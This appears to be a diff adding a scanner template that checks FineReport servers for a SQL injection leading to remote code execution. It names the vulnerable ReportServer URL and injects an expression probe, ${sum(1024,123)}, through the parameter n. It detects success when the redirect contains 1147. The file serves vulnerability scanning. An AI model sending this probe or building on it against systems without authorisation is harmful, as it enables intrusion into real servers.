@@ -1,0 +1,27 @@
+id: finereport-sqli-rce
+brief:
+    title: FineReport SQLi - Remote Code Execution
+    by: adeljck
+    level: critical
+    about: Access URL:/webroot/decision/view/ReportServer?test=&n=, which can execute the SQL statement in GET parameter n. This vulnerability is caused by Fanruan's own sqlite-jdbc-x.x.x.x.jar driver.
+    label:
+        - finereport
+        - rce
+        - sqli
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/webroot/decision/view/ReportServer?{{string}}=&n=${sum(1024,123)}'
+      head:
+        Content-Type: application/x-www-form-urlencoded
+      signs:
+        - "on": word
+          has:
+            - report?{{string}}&n=1147
+          in: location
+          need: all
+        - "on": status
+          status:
+            - 200
+            - 302
